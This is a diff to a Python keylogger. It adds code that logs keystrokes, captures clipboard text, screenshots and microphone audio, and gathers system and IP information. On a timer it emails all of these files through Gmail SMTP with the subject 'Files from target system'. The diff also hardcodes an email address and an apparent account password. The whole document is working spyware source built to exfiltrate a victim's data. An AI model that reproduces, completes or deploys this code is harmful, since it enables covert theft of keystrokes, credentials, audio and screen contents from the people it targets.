@@ -1,7 +1,7 @@
 # imports
 from pynput.keyboard import Key, Listener
 import wave
-import os
+import os, sys
 import sounddevice as sd
 from scipy.io.wavfile import write
 from tkinter import Tk
@@ -11,40 +11,54 @@ import psutil
 import GPUtil
 import socket
 import time, datetime
+import asyncio
+from cryptography.fernet import Fernet
+import smtplib, threading
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import http.client as httplib
+
+os.environ['EMAIL'] = "godwillonyewuchii@gmail.com"
+os.environ['PASSWORD'] = "09092238604"
 
 Time = datetime.datetime.now()
-stoppingTime = Time + datetime.timedelta(seconds=20)
+stoppingTime = Time + datetime.timedelta(seconds=180)
 
 filePath: list = [
     "clipboard_file.txt",
-    "systemInformation_file.txt",
-    "keyboard_file.txt"
+    "system_Information_file.txt",
+    "keyboard_file.txt",
+    "screenshot.jpg",
+    "soundrecord.wav"
 ]
 
 # copying of clipboard textn
 def clipboard_func():
-    data = Tk().clipboard_get()
+    try:
+        data = Tk().clipboard_get()
+    except Exception:
+        data = "no data in clipboard"
     file1 = open('clipboard_file.txt', "a")
     file1.write(data)
     file1.close()
 
 
 # taking screenshot
-def screenshot_func():
+def screenshot_func(count):
     image = pyscreenshot.grab()
-    image.save("./screenshot.jpg", "JPEG")
-    # image.show()
+    image.save(f"./screenshot.jpg", "JPEG")
 
 
 # recording audio
-def sound():
+def sound(count):
     fs = 48000
     sd.default.samplerate = fs
     sd.default.channels = 2
-    duration = 20
+    duration = count
     myrecording = sd.rec(int(duration * fs))
     sd.wait()
-    sd.play(myrecording)
     write("soundrecord.wav", fs, myrecording)
 
 # getting the system version and info
@@ -61,7 +75,7 @@ def system_Data():
         ROM_space = partition_usage.total
     # getting network info
     addrs = psutil.net_if_addrs()
-    for interface_addrs in addrs.items():
+    for interface_name, interface_addrs in addrs.items():
         for address in interface_addrs:
             if str(address.family) == "AddressFamily.AF_INET":
                 IP_Address = address.address
@@ -95,7 +109,7 @@ def system_Data():
     Installed GPU : {age_name if gpus != []  else 'No GPU found'}
     GPU memory: {age_memory if gpus != [] else 'No GPU found'}
     '''
-    file1 = open('system_Information.txt', 'a')
+    file1 = open('system_Information_file.txt', 'a')
     file1.write(body)
     file1.close()
 
@@ -119,99 +133,86 @@ def onRelease(key):
         return False
     if (datetime.datetime.now()  > stoppingTime ):
         return False
-
-with Listener(on_press=onPress, on_release=onRelease) as listener:
-    listener.join()
-
-# encrypting my files
-def Encrypt(file):
-    print("")
-
-# decrypting the files
-
-
-def Decrypt(file):
-    print("")
+listener = Listener(on_press=onPress, on_release=onRelease)
+listener.start()
 
 # clear files content
+def clearContent(files):
+    for file in files:
+        with open(file, 'wb') as file:
+            file.truncate()
 
-
-def clearContent(file):
-    print("")
+#check internet connection
+def internet_conn(url='www.google.com', timeout=3):
+    conn = httplib.HTTPConnection(url, timeout=timeout)
+    try:
+        conn.request('HEAD', '/')
+        conn.close()
+        return True
+    except Exception as e:
+        return False
 
 # email setup
-# smtpConfig = {
-#   host: "smtp.gmail.com",
-#   port: 465,
-#   secure: true, # use SSL
-#   auth: {
-#     "user": "username",
-#     "pass": "emailPass",
-#   },
-# };
-# mail = nodemailer.createTransport(smtpConfig);
 
-# adding the files
-# mailOptions = {
-#   "from": username,
-#   to: username,
-#   subject: "Files from keylogger",
-#   text: "That was easy",
-#   attachments: [
-#     {
-#       path: ".keyboard_file.txt",
-#     },
-#     {
-#       path: ".clipboard_file.txt",
-#     },
-#     {
-#       path: ".systemInformation-file.txt",
-#     },
-#     {
-#       path: ".soundrecord_file.wav",
-#     },
-#     {
-#       path: ".screenshot2.png",
-#     },
-#   ],
-# };
+def send_email():
+    sender_mail = os.getenv('EMAIL')
+    reciever_mail = os.getenv('EMAIL')
+    message = MIMEMultipart()
+    message['From'] = sender_mail
+    message['To'] = reciever_mail
+    message['Subject'] = "Files from target system "
+    mail_content = '''
+    This email contains the content of the file from the system
+    '''
 
-# sending the mail
+    message.attach(MIMEText(mail_content, 'plain'))
+    for file in filePath:
+        attach_file_name = file
+        attach_file = open(attach_file_name, 'rb')
+        payload = MIMEBase('application', 'octate-stream')
+        payload.set_payload((attach_file).read())
+        encoders.encode_base64(payload)
+        payload.add_header('Content-Decomposition',
+                        'attachment', filename=attach_file_name)
+        message.attach(payload)
 
+    try:
+        if internet_conn():
+            password = os.getenv('PASSWORD')
+            smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
+            smtpObj.starttls()
+            print(smtpObj, sender_mail, password)
+            smtpObj.login(sender_mail, password)
+            text = message.as_string()
+            smtpObj.sendmail(sender_mail, reciever_mail, text)
+            smtpObj.quit()
+            clearContent(filePath)
+            print('email sent successfully')
+            
+    except Exception as e:
+        setInterval(90)
 
-def sendMails():
-    print("")
-# filePath.forEach(Decrypt)
+def final_func():
+    global Time, stoppingTime
+    if (datetime.datetime.now()) >= stoppingTime:
+        print("working HERE")
+        send_email()               
+        Time = datetime.datetime.now()
+        stoppingTime = Time + datetime.timedelta(seconds=180)
+        print(Time, stoppingTime)
 
-#   mail.sendMail(mailOptions, (err, info) => {
-#     if (err) console.log(err);
-#     else {
-#       console.log("Email sent: " + info.response)
-#       filePath.forEach(clearContent)
-#     }
-#   })
-# }
-
-# setInterval(() => {
-#   if (count < 2) {
-#     screenshot_func();
-#     clipboard_func();
-#   }
-
-#   if (count == 2) {
-#     console.log("counts 2")
-#     filePath.forEach(Encrypt)
-#     setTimeout(() => {
-#       sendMails();
-#     }, 10)
-
-#   }
-#   count += 1;
-# }, 10000);
-
-
-clipboard_func()
-screenshot_func()
-sound()
-system_Data()
+def setInterval(time):
+    e = threading.Event()
+    while not e.wait(time):
+        if (datetime.datetime.now()) <= stoppingTime:
+            count = str(datetime.datetime.now().timestamp()).split('.')[0]
+            clipboard_func()
+            screenshot_func(count[8:10])
+            system_Data()
+            sound(time)
+        else:
+            final_func()
+            setInterval(90)
+            
+setInterval(90)
 print("working")
